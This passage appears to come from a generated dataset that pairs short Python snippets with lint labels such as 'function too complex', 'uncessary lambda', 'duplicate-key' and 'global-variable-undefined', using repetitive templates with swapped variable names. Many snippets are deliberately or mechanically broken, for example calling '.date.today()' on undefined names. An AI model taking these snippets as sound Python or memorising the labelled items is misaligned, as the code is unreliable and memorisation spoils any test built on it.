20       else:
21           if breaks == 2:
22               return breaks
23           return breaks
24       return breaks
",1 - warning: function too complex
"1   def foo():
2       Foo = 2
3       if Foo == 5:
4           return Foo
5       elif Foo == 6:
6           return Foo
7       elif Foo == 7:
8           return Foo
9       elif Foo == 8:
10           return Foo
11       elif Foo == 9:
12           return Foo
13       elif Foo == 10:
14           if Foo == 8:
15               while True:
16                   return True
17           elif Foo == 8:
18               with Foo:
19                   return 8
20       else:
21           if Foo == 2:
22               return Foo
23           return Foo
24       return Foo
",1 - warning: function too complex
"1   def foo():
2       v = 2
3       if v == 5:
4           return v
5       elif v == 6:
6           return v
7       elif v == 7:
8           return v
9       elif v == 8:
10           return v
11       elif v == 9:
12           return v
13       elif v == 10:
14           if v == 8:
15               while True:
16                   return True
17           elif v == 8:
18               with v:
19                   return 8
20       else:
21           if v == 2:
22               return v
23           return v
24       return v
",1 - warning: function too complex
"1   def foo():
2       obj = 2
3       if obj == 5:
4           return obj
5       elif obj == 6:
6           return obj
7       elif obj == 7:
8           return obj
9       elif obj == 8:
10           return obj
11       elif obj == 9:
12           return obj
13       elif obj == 10:
14           if obj == 8:
15               while True:
16                   return True
17           elif obj == 8:
18               with obj:
19                   return 8
20       else:
21           if obj == 2:
22               return obj
23           return obj
24       return obj
",1 - warning: function too complex
"1   def foo():
2       base = 2
3       if base == 5:
4           return base
5       elif base == 6:
6           return base
7       elif base == 7:
8           return base
9       elif base == 8:
10           return base
11       elif base == 9:
12           return base
13       elif base == 10:
14           if base == 8:
15               while True:
16                   return True
17           elif base == 8:
18               with base:
19                   return 8
20       else:
21           if base == 2:
22               return base
23           return base
24       return base
",1 - warning: function too complex
"1   def foo():
2       sys = 2
3       if sys == 5:
4           return sys
5       elif sys == 6:
6           return sys
7       elif sys == 7:
8           return sys
9       elif sys == 8:
10           return sys
11       elif sys == 9:
12           return sys
13       elif sys == 10:
14           if sys == 8:
15               while True:
16                   return True
17           elif sys == 8:
18               with sys:
19                   return 8
20       else:
21           if sys == 2:
22               return sys
23           return sys
24       return sys
",1 - warning: function too complex
"1   def foo():
2       zero_range = 2
3       if zero_range == 5:
4           return zero_range
5       elif zero_range == 6:
6           return zero_range
7       elif zero_range == 7:
8           return zero_range
9       elif zero_range == 8:
10           return zero_range
11       elif zero_range == 9:
12           return zero_range
13       elif zero_range == 10:
14           if zero_range == 8:
15               while True:
16                   return True
17           elif zero_range == 8:
18               with zero_range:
19                   return 8
20       else:
21           if zero_range == 2:
22               return zero_range
23           return zero_range
24       return zero_range
",1 - warning: function too complex
"1   def foo():
2       types = 2
3       if types == 5:
4           return types
5       elif types == 6:
6           return types
7       elif types == 7:
8           return types
9       elif types == 8:
10           return types
11       elif types == 9:
12           return types
13       elif types == 10:
14           if types == 8:
15               while True:
16                   return True
17           elif types == 8:
18               with types:
19                   return 8
20       else:
21           if types == 2:
22               return types
23           return types
24       return types
",1 - warning: function too complex
"1   def foo():
2       vmax = 2
3       if vmax == 5:
4           return vmax
5       elif vmax == 6:
6           return vmax
7       elif vmax == 7:
8           return vmax
9       elif vmax == 8:
10           return vmax
11       elif vmax == 9:
12           return vmax
13       elif vmax == 10:
14           if vmax == 8:
15               while True:
16                   return True
17           elif vmax == 8:
18               with vmax:
19                   return 8
20       else:
21           if vmax == 2:
22               return vmax
23           return vmax
24       return vmax
",1 - warning: function too complex
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   def foo():
5       na_rm = 2
6       if na_rm == 5:
7           return na_rm
8       elif na_rm == 6:
9           return na_rm
10       elif na_rm == 7:
11           return na_rm
12       elif na_rm == 8:
13           return na_rm
14       elif na_rm == 9:
15           return na_rm
16       elif na_rm == 10:
17           if na_rm == 8:
18               while True:
19                   return True
20           elif na_rm == 8:
21               with na_rm:
22                   return 8
23       else:
24           if na_rm == 2:
25               return na_rm
26           return na_rm
27       return na_rm
28   import datetime
29   na_rm: str = i.date.today().strftime('%y-%m-%d')
",4 - warning: function too complex
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   def foo():
4       BaseClass = 2
5       if BaseClass == 5:
6           return BaseClass
7       elif BaseClass == 6:
8           return BaseClass
9       elif BaseClass == 7:
10           return BaseClass
11       elif BaseClass == 8:
12           return BaseClass
13       elif BaseClass == 9:
14           return BaseClass
15       elif BaseClass == 10:
16           if BaseClass == 8:
17               while True:
18                   return True
19           elif BaseClass == 8:
20               with BaseClass:
21                   return 8
22       else:
23           if BaseClass == 2:
24               return BaseClass
25           return BaseClass
26       return BaseClass
27   import datetime
28   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   def foo():
4       func = 2
5       if func == 5:
6           return func
7       elif func == 6:
8           return func
9       elif func == 7:
10           return func
11       elif func == 8:
12           return func
13       elif func == 9:
14           return func
15       elif func == 10:
16           if func == 8:
17               while True:
18                   return True
19           elif func == 8:
20               with func:
21                   return 8
22       else:
23           if func == 2:
24               return func
25           return func
26       return func
27   import datetime
28   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   def foo():
4       fh = 2
5       if fh == 5:
6           return fh
7       elif fh == 6:
8           return fh
9       elif fh == 7:
10           return fh
11       elif fh == 8:
12           return fh
13       elif fh == 9:
14           return fh
15       elif fh == 10:
16           if fh == 8:
17               while True:
18                   return True
19           elif fh == 8:
20               with fh:
21                   return 8
22       else:
23           if fh == 2:
24               return fh
25           return fh
26       return fh
27   import datetime
28   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   def foo():
4       d = 2
5       if d == 5:
6           return d
7       elif d == 6:
8           return d
9       elif d == 7:
10           return d
11       elif d == 8:
12           return d
13       elif d == 9:
14           return d
15       elif d == 10:
16           if d == 8:
17               while True:
18                   return True
19           elif d == 8:
20               with d:
21                   return 8
22       else:
23           if d == 2:
24               return d
25           return d
26       return d
27   import datetime
28   obj: str = d.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   def foo():
4       y = 2
5       if y == 5:
6           return y
7       elif y == 6:
8           return y
9       elif y == 7:
10           return y
11       elif y == 8:
12           return y
13       elif y == 9:
14           return y
15       elif y == 10:
16           if y == 8:
17               while True:
18                   return True
19           elif y == 8:
20               with y:
21                   return 8
22       else:
23           if y == 2:
24               return y
25           return y
26       return y
27   import datetime
28   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   def foo():
4       extended_breaks = 2
5       if extended_breaks == 5:
6           return extended_breaks
7       elif extended_breaks == 6:
8           return extended_breaks
9       elif extended_breaks == 7:
10           return extended_breaks
11       elif extended_breaks == 8:
12           return extended_breaks
13       elif extended_breaks == 9:
14           return extended_breaks
15       elif extended_breaks == 10:
16           if extended_breaks == 8:
17               while True:
18                   return True
19           elif extended_breaks == 8:
20               with extended_breaks:
21                   return 8
22       else:
23           if extended_breaks == 2:
24               return extended_breaks
25           return extended_breaks
26       return extended_breaks
27   import datetime
28   v2: str = args.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   def foo():
4       obj = 2
5       if obj == 5:
6           return obj
7       elif obj == 6:
8           return obj
9       elif obj == 7:
10           return obj
11       elif obj == 8:
12           return obj
13       elif obj == 9:
14           return obj
15       elif obj == 10:
16           if obj == 8:
17               while True:
18                   return True
19           elif obj == 8:
20               with obj:
21                   return 8
22       else:
23           if obj == 2:
24               return obj
25           return obj
26       return obj
27   import datetime
28   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   def foo():
4       MSG = 2
5       if MSG == 5:
6           return MSG
7       elif MSG == 6:
8           return MSG
9       elif MSG == 7:
10           return MSG
11       elif MSG == 8:
12           return MSG
13       elif MSG == 9:
14           return MSG
15       elif MSG == 10:
16           if MSG == 8:
17               while True:
18                   return True
19           elif MSG == 8:
20               with MSG:
21                   return 8
22       else:
23           if MSG == 2:
24               return MSG
25           return MSG
26       return MSG
27   import datetime
28   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   def foo():
4       lru_cache = 2
5       if lru_cache == 5:
6           return lru_cache
7       elif lru_cache == 6:
8           return lru_cache
9       elif lru_cache == 7:
10           return lru_cache
11       elif lru_cache == 8:
12           return lru_cache
13       elif lru_cache == 9:
14           return lru_cache
15       elif lru_cache == 10:
16           if lru_cache == 8:
17               while True:
18                   return True
19           elif lru_cache == 8:
20               with lru_cache:
21                   return 8
22       else:
23           if lru_cache == 2:
24               return lru_cache
25           return lru_cache
26       return lru_cache
27   import datetime
28   v1: str = log_format.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   def foo():
4       distribution = 2
5       if distribution == 5:
6           return distribution
7       elif distribution == 6:
8           return distribution
9       elif distribution == 7:
10           return distribution
11       elif distribution == 8:
12           return distribution
13       elif distribution == 9:
14           return distribution
15       elif distribution == 10:
16           if distribution == 8:
17               while True:
18                   return True
19           elif distribution == 8:
20               with distribution:
21                   return 8
22       else:
23           if distribution == 2:
24               return distribution
25           return distribution
26       return distribution
27   import datetime
28   v2: str = c.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   def foo():
4       p = 2
5       if p == 5:
6           return p
7       elif p == 6:
8           return p
9       elif p == 7:
10           return p
11       elif p == 8:
12           return p
13       elif p == 9:
14           return p
15       elif p == 10:
16           if p == 8:
17               while True:
18                   return True
19           elif p == 8:
20               with p:
21                   return 8
22       else:
23           if p == 2:
24               return p
25           return p
26       return p
27   import datetime
28   func: str = v1.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   def foo():
4       accuracy = 2
5       if accuracy == 5:
6           return accuracy
7       elif accuracy == 6:
8           return accuracy
9       elif accuracy == 7:
10           return accuracy
11       elif accuracy == 8:
12           return accuracy
13       elif accuracy == 9:
14           return accuracy
15       elif accuracy == 10:
16           if accuracy == 8:
17               while True:
18                   return True
19           elif accuracy == 8:
20               with accuracy:
21                   return 8
22       else:
23           if accuracy == 2:
24               return accuracy
25           return accuracy
26       return accuracy
27   import datetime
28   v: str = contents.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   def foo():
4       name = 2
5       if name == 5:
6           return name
7       elif name == 6:
8           return name
9       elif name == 7:
10           return name
11       elif name == 8:
12           return name
13       elif name == 9:
14           return name
15       elif name == 10:
16           if name == 8:
17               while True:
18                   return True
19           elif name == 8:
20               with name:
21                   return 8
22       else:
23           if name == 2:
24               return name
25           return name
26       return name
27   import datetime
28   c: str = transform.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   def foo():
4       func = 2
5       if func == 5:
6           return func
7       elif func == 6:
8           return func
9       elif func == 7:
10           return func
11       elif func == 8:
12           return func
13       elif func == 9:
14           return func
15       elif func == 10:
16           if func == 8:
17               while True:
18                   return True
19           elif func == 8:
20               with func:
21                   return 8
22       else:
23           if func == 2:
24               return func
25           return func
26       return func
27   import datetime
28   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",3 - warning: function too complex
"foo = lambda: min(1, 2)
",1 - warning: uncessary lambda
"1   breaks_ = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   doc = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   value = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   v2 = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   datetime = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   log_breaks = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   lru_cache = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   SECONDS = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   log_trans = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   obj = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   n = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   nearest_int = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   num2date = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   num2date = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   limits = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   a = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   fh = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   start = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   dmin = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   rng = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   __all__ = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   a = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   trans_new = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   breaks = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   current_date = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   probit_trans = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   _trans = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   numbers = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   log_format = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   msg = lambda : min(1, 2)
",1 - warning: uncessary lambda
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   x = lambda : min(1, 2)
5   import datetime
6   na_rm: str = i.date.today().strftime('%y-%m-%d')
",4 - warning: uncessary lambda
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   tz = lambda : min(1, 2)
4   import datetime
5   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   sys = lambda : min(1, 2)
4   import datetime
5   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   BaseClass = lambda : min(1, 2)
4   import datetime
5   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   transform = lambda : min(1, 2)
4   import datetime
5   obj: str = d.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   breaks = lambda : min(1, 2)
4   import datetime
5   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   datetime = lambda : min(1, 2)
4   import datetime
5   v2: str = args.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   log_format = lambda : min(1, 2)
4   import datetime
5   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   v1_to_v2_map = lambda : min(1, 2)
4   import datetime
5   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   y = lambda : min(1, 2)
4   import datetime
5   v1: str = log_format.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   zero_range = lambda : min(1, 2)
4   import datetime
5   v2: str = c.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   lru_cache = lambda : min(1, 2)
4   import datetime
5   func: str = v1.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   print_values_but_five = lambda : min(1, 2)
4   import datetime
5   v: str = contents.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   _get = lambda : min(1, 2)
4   import datetime
5   c: str = transform.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   dmin = lambda : min(1, 2)
4   import datetime
5   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",3 - warning: uncessary lambda
"foo = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   MSG = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   probit_trans = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   ABC = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   date2num = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   args = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   _get = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   base = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   doc = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   _trans = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   start = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   date2num = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   CONTINUOUS_KINDS = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   var = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   breaks = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   log_trans = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   logit_trans = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   nomatch = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   log_breaks = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   np = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   sys = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   defaultdict = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   breaks = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   nearest_int = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   n = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   Iterator = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   breaks_ = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   BaseClass = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   DISCRETE_KINDS = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   k = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   x = {'key': 'value1', 'key': 'value2'}
",1 - error: duplicate-key
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   types = {'key': 'value1', 'key': 'value2'}
5   import datetime
6   na_rm: str = i.date.today().strftime('%y-%m-%d')
",4 - error: duplicate-key
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   transform = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   CONTINUOUS_KINDS = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   dataspace_is_numerical = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   incomparables = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   obj: str = d.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   aesthetic = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   Foo = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   v2: str = args.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   _get = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   contents = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   probit_trans = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   v1: str = log_format.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   probability_trans = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   v2: str = c.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   reduce = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   func: str = v1.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   value = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   v: str = contents.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   trans = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   c: str = transform.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   v2 = {'key': 'value1', 'key': 'value2'}
4   import datetime
5   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",3 - error: duplicate-key
"var = 1


def foo():
    global v
    print(v)
    v = 10
    print(v)


foo()
print(var)
",5 - error: global-variable-undefined
"1   self = 1
2   
3   def foo():
4       global v
5       print(limits)
6       limits = 10
7       print(limits)
8   num2date()
9   print(self)
",5 - error: global-variable-undefined
"1   datetime = 1
2   
3   def foo():
4       global v
5       print(BaseClass)
6       BaseClass = 10
7       print(BaseClass)
8   val()
9   print(datetime)
",5 - error: global-variable-undefined
"1   nearest_int = 1
2   
3   def foo():
4       global v
5       print(fh)
6       fh = 10
7       print(fh)
8   v1()
9   print(nearest_int)
",5 - error: global-variable-undefined
"1   np = 1
2   
3   def foo():
4       global v
5       print(NANOSECONDS)
6       NANOSECONDS = 10
7       print(NANOSECONDS)
8   np()
9   print(np)
",5 - error: global-variable-undefined
"1   skip = 1
2   
3   def foo():
4       global v
5       print(start)
6       start = 10
7       print(start)
8   foo()
9   print(skip)
",5 - error: global-variable-undefined
"1   na_rm = 1
2   
3   def foo():
4       global v
5       print(v1)
6       v1 = 10
7       print(v1)
8   breaks_()
9   print(na_rm)
",5 - error: global-variable-undefined
"1   nearest_int = 1
2   
3   def foo():
4       global v
5       print(data)
6       data = 10
7       print(data)
8   i()
9   print(nearest_int)
",5 - error: global-variable-undefined
"1   MSG = 1
2   
3   def foo():
4       global v
5       print(log_format)
6       log_format = 10
7       print(log_format)
8   cdists()
9   print(MSG)
",5 - error: global-variable-undefined
"1   cdists = 1
2   
3   def foo():
4       global v
5       print(ABC)
6       ABC = 10
7       print(ABC)
8   v1_to_v2_map()
9   print(cdists)
",5 - error: global-variable-undefined
"1   types = 1
2   
3   def foo():
4       global v
5       print(transform)
6       transform = 10
7       print(transform)
8   trans()
9   print(types)
",5 - error: global-variable-undefined
"1   nearest_int = 1
2   
3   def foo():
4       global v
5       print(sys)
6       sys = 10
7       print(sys)
8   date_format()
9   print(nearest_int)
",5 - error: global-variable-undefined
"1   k = 1
2   
3   def foo():
4       global v
5       print(reduce)
6       reduce = 10
7       print(reduce)
8   x()
9   print(k)
",5 - error: global-variable-undefined
"1   x = 1
2   
3   def foo():
4       global v
5       print(d)
6       d = 10
7       print(d)
8   n()
9   print(x)
",5 - error: global-variable-undefined
"1   nomatch = 1
2   
3   def foo():
4       global v
5       print(probability_trans)
6       probability_trans = 10
7       print(probability_trans)
8   log_breaks()
9   print(nomatch)
",5 - error: global-variable-undefined
"1   limits = 1
2   
3   def foo():
4       global v
5       print(d)
6       d = 10
7       print(d)
8   sys()
9   print(limits)
",5 - error: global-variable-undefined
"1   pd = 1
2   
3   def foo():
4       global v
5       print(v)
6       v = 10
7       print(v)
8   i()
9   print(pd)
",5 - error: global-variable-undefined
"1   c = 1
2   
3   def foo():
4       global v
5       print(func)
6       func = 10
7       print(func)
8   dmin()
9   print(c)
",5 - error: global-variable-undefined
"1   self = 1
2   
3   def foo():
4       global v
5       print(incomparables)
6       incomparables = 10
7       print(incomparables)
8   SECONDS()
9   print(self)
",5 - error: global-variable-undefined
"1   item = 1
2   
3   def foo():
4       global v
5       print(Iterator)
6       Iterator = 10
7       print(Iterator)
8   OrderedDict()
9   print(item)
",5 - error: global-variable-undefined
"1   log2_trans = 1
2   
3   def foo():
4       global v
5       print(DISCRETE_KINDS)
6       DISCRETE_KINDS = 10
7       print(DISCRETE_KINDS)
8   Iterator()
9   print(log2_trans)
",5 - error: global-variable-undefined
"1   num2date = 1
2   
3   def foo():
4       global v
5       print(np)
6       np = 10
7       print(np)
8   name()
9   print(num2date)
",5 - error: global-variable-undefined
"1   doc = 1
2   
3   def foo():
4       global v
5       print(cdists)
6       cdists = 10
7       print(cdists)
8   aesthetic()
9   print(doc)
",5 - error: global-variable-undefined
"1   BaseClass = 1
2   
3   def foo():
4       global v
5       print(n)
6       n = 10
7       print(n)
8   msg()
9   print(BaseClass)
",5 - error: global-variable-undefined
"1   log10_trans = 1
2   
3   def foo():
4       global v
5       print(trans)
6       trans = 10
7       print(trans)
8   a()
9   print(log10_trans)
",5 - error: global-variable-undefined
"1   probability_trans = 1
2   
3   def foo():
4       global v
5       print(probability_trans)
6       probability_trans = 10
7       print(probability_trans)
8   BaseClass()
9   print(probability_trans)
",5 - error: global-variable-undefined
"1   lru_cache = 1
2   
3   def foo():
4       global v
5       print(ABC)
6       ABC = 10
7       print(ABC)
8   doc()
9   print(lru_cache)
",5 - error: global-variable-undefined
"1   ABC = 1
2   
3   def foo():
4       global v
5       print(tz)
6       tz = 10
7       print(tz)
8   ABC()
9   print(ABC)
",5 - error: global-variable-undefined
"1   MethodType = 1
2   
3   def foo():
4       global v
5       print(klass_name)
6       klass_name = 10
7       print(klass_name)
8   vmax()
9   print(MethodType)
",5 - error: global-variable-undefined
"1   log10_trans = 1
2   
3   def foo():
4       global v
5       print(name)
6       name = 10
7       print(name)
8   NANOSECONDS()
9   print(log10_trans)
",5 - error: global-variable-undefined
"1   name = 1
2   
3   def foo():
4       global v
5       print(aesthetic)
6       aesthetic = 10
7       print(aesthetic)
8   current_date()
9   print(name)
",5 - error: global-variable-undefined
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   DISCRETE_KINDS = 1
5   
6   def foo():
7       global v
8       print(pd)
9       pd = 10
10       print(pd)
11   num2date()
12   print(DISCRETE_KINDS)
13   import datetime
14   na_rm: str = i.date.today().strftime('%y-%m-%d')
",8 - error: global-variable-undefined
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   dataspace_is_numerical = 1
4   
5   def foo():
6       global v
7       print(v1)
8       v1 = 10
9       print(v1)
10   obj()
11   print(dataspace_is_numerical)
12   import datetime
13   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   v1_to_v2_map = 1
4   
5   def foo():
6       global v
7       print(bar)
8       bar = 10
9       print(bar)
10   y()
11   print(v1_to_v2_map)
12   import datetime
13   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   incomparables = 1
4   
5   def foo():
6       global v
7       print(func)
8       func = 10
9       print(func)
10   n()
11   print(incomparables)
12   import datetime
13   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",7 - error: global-variable-undefined
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   minor_breaks = 1
4   
5   def foo():
6       global v
7       print(timedelta_format)
8       timedelta_format = 10
9       print(timedelta_format)
10   mpl_format()
11   print(minor_breaks)
12   import datetime
